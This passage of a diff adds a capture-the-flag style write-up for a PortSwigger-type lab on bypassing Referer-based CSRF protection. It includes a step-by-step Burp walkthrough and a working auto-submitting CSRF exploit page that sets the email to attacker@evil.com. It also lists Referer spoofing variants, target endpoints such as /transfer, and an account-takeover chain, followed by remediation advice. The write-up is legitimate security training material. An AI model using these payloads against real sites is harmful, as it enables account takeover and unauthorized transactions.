@@ -4791,3 +4791,504 @@ OAuth refreshes session
 ---
 
 Refresh victim session through OAuth → obtain fresh SameSite=Lax cookie → immediately perform CSRF attack
+
+---
+
+# 🐞 Lab-11 — Referer-Based CSRF Defense Bypass
+
+---
+
+## 🔥 Overview
+
+This lab demonstrates a weak CSRF defense mechanism that relies on validating the:
+
+```http
+Referer
+```
+
+header.
+
+However, the validation is implemented incorrectly:
+
+✔ Validate only when Referer exists  
+❌ Skip validation if Referer is missing  
+
+---
+
+👉 This creates a complete CSRF bypass condition.
+
+---
+
+## 🧠 What Is This Topic?
+
+### 🔹 Referer Header
+
+Browser automatically sends:
+
+```http
+Referer: https://example.com/page
+```
+
+It tells the server where the request originated.
+
+---
+
+### 🔹 Intended Security Logic
+
+Developers attempt:
+
+```python
+if referer contains victim.com:
+    allow
+else:
+    block
+```
+
+---
+
+### ❌ Real Vulnerable Logic
+
+```python
+if referer exists:
+    validate
+else:
+    allow
+```
+
+---
+
+👉 Missing Referer becomes a bypass condition.
+
+---
+
+## 🧪 Lab Walkthrough (Step-by-Step)
+
+---
+
+### 🧩 Step 1 — Capture Change Email Request
+
+Login:
+
+```text
+wiener:peter
+```
+
+Change email normally.
+
+Go to:
+
+```text
+Burp → Proxy → HTTP History
+```
+
+Find request:
+
+```http
+POST /my-account/change-email
+```
+
+---
+
+### 🧠 Observation
+
+Request contains:
+
+```http
+Referer: https://YOUR-LAB-ID.web-security-academy.net/my-account
+```
+
+---
+
+## 📸 Screenshot — Referer Header Present
+
+![referer-present](../images/referer-presenr-csrf.png)
+
+---
+
+### 🧩 Step 2 — Modify Referer Header
+
+Send request to Repeater.
+
+Change:
+
+```http
+Referer: https://evil.com
+```
+
+---
+
+### 🧠 Result
+
+❌ Request rejected
+
+---
+
+### 🧠 Insight
+
+Application validates Referer IF present.
+
+---
+
+## 📸 Screenshot — Modified Referer Rejected
+
+![referer-modified](../images/referer-modified-csrf.png)
+
+---
+
+### 🧩 Step 3 — Remove Referer Completely
+
+Delete the entire header:
+
+```http
+Referer:
+```
+
+---
+
+### 🧠 Result
+
+✔ Request accepted
+
+---
+
+### 🧠 Vulnerability Confirmed
+
+Server validates Referer ONLY when present.
+
+If missing:
+
+```text
+validation skipped
+```
+
+---
+
+## 📸 Screenshot — Referer Removed Successfully
+
+![referer-removed](../images/referer-removed-csrf.png)
+
+---
+
+### 🧩 Step 4 — Build CSRF Exploit
+
+```html
+<meta name="referrer" content="no-referrer">
+
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+```
+
+---
+
+### 🧠 Payload Breakdown
+
+#### 🔹 Meta Tag
+
+```html
+<meta name="referrer" content="no-referrer">
+```
+
+➡️ Removes Referer header completely.
+
+---
+
+#### 🔹 Auto-submit Form
+
+```javascript
+document.forms[0].submit();
+```
+
+➡️ Executes CSRF silently without user interaction.
+
+---
+
+### 🧩 Step 5 — Deliver Exploit
+
+1️⃣ Store exploit on exploit server  
+2️⃣ Click:
+
+```text
+Deliver to victim
+```
+
+---
+
+### 🧠 Result
+
+✔ Victim browser sends request  
+✔ No Referer header included  
+✔ Server skips validation  
+✔ Email changes successfully  
+✔ Lab solved  
+
+---
+
+## 💣 Payload Breakdown
+
+### 🔹 CSRF Form
+
+```html
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+```
+
+---
+
+### 🔹 Referer Removal
+
+```html
+<meta name="referrer" content="no-referrer">
+```
+
+---
+
+### 🔹 Silent Execution
+
+```javascript
+document.forms[0].submit();
+```
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🔥 Scenario 1 — Banking Applications
+
+Endpoints:
+
+```text
+/transfer
+/send-money
+/withdraw
+```
+
+Weak logic:
+
+```python
+if Referer contains bank.com:
+    allow
+```
+
+Attacker removes Referer → transaction succeeds.
+
+---
+
+### 🔥 Scenario 2 — Account Takeover
+
+Endpoints:
+
+```text
+/change-email
+/change-password
+/disable-2fa
+```
+
+Attack chain:
+
+```text
+Change email → reset password → full takeover
+```
+
+---
+
+### 🔥 Scenario 3 — Admin Panels
+
+Endpoints:
+
+```text
+/admin/delete-user
+/admin/update-role
+```
+
+Applications trust Referer instead of proper CSRF protection.
+
+---
+
+### 🔥 Scenario 4 — Mobile WebViews
+
+Some mobile browsers remove Referer automatically.
+
+Backend assumes request is safe.
+
+---
+
+### 🔥 Scenario 5 — Privacy Browsers
+
+Examples:
+
+```text
+Brave
+Firefox Strict Mode
+Ad Blockers
+```
+
+These can strip Referer headers automatically.
+
+---
+
+## ⚔️ Attack Chain
+
+1️⃣ Victim visits attacker page  
+2️⃣ Meta tag removes Referer  
+3️⃣ Form auto-submits silently  
+4️⃣ Browser sends authenticated request  
+5️⃣ No Referer header present  
+6️⃣ Server skips validation  
+7️⃣ Sensitive action executes  
+
+---
+
+## 🎯 High-Value Endpoints
+
+```text
+/change-email
+/change-password
+/transfer
+/withdraw
+/admin/update-role
+/api/user/update
+/graphql
+```
+
+---
+
+## ⚠️ Real-World Variations
+
+---
+
+### 🔹 Variation 1 — Partial Match Bypass
+
+Server checks:
+
+```python
+if "example.com" in Referer
+```
+
+Attacker uses:
+
+```text
+https://evil.com/?example.com
+```
+
+---
+
+### 🔹 Variation 2 — Subdomain Abuse
+
+```text
+https://example.com.evil.com
+```
+
+---
+
+### 🔹 Variation 3 — HTTPS → HTTP Downgrade
+
+```text
+https://attacker.com → http://victim.com
+```
+
+Browser strips Referer automatically.
+
+---
+
+### 🔹 Variation 4 — Referrer-Policy Misconfiguration
+
+```http
+Referrer-Policy: no-referrer
+```
+
+All requests lose Referer.
+
+---
+
+## 🛡️ Remediation
+
+---
+
+### ✅ Fix 1 — Use CSRF Tokens
+
+Every sensitive request must include:
+
+```text
+unique
+unpredictable
+session-bound token
+```
+
+---
+
+### ✅ Fix 2 — Validate Origin Header
+
+Use:
+
+```http
+Origin
+```
+
+instead of relying on Referer only.
+
+---
+
+### ✅ Fix 3 — Block Missing Referer
+
+Correct logic:
+
+```python
+if referer missing:
+    block
+
+if referer invalid:
+    block
+```
+
+---
+
+### ✅ Fix 4 — Use SameSite Cookies
+
+```http
+Set-Cookie: session=xyz; SameSite=Strict
+```
+
+---
+
+### ✅ Fix 5 — Re-authentication
+
+Require password before critical actions.
+
+---
+
+## 🧠 Mental Model
+
+```text
+Referer is optional
+↓
+Attacker removes it
+↓
+Validation disappears
+↓
+CSRF succeeds
+```
+
+---
+
+## 🎯 Final Summary
+
+✔ Referer-based CSRF protection is weak  
+✔ Missing Referer must NEVER be trusted  
+✔ Browser behavior can remove Referer naturally  
+✔ Proper CSRF tokens are mandatory  
+
+---
+
+## 🔥 Final One-Liner
+
+```text
+If Referer is only validated when present, removing it completely bypasses CSRF protection.
+```
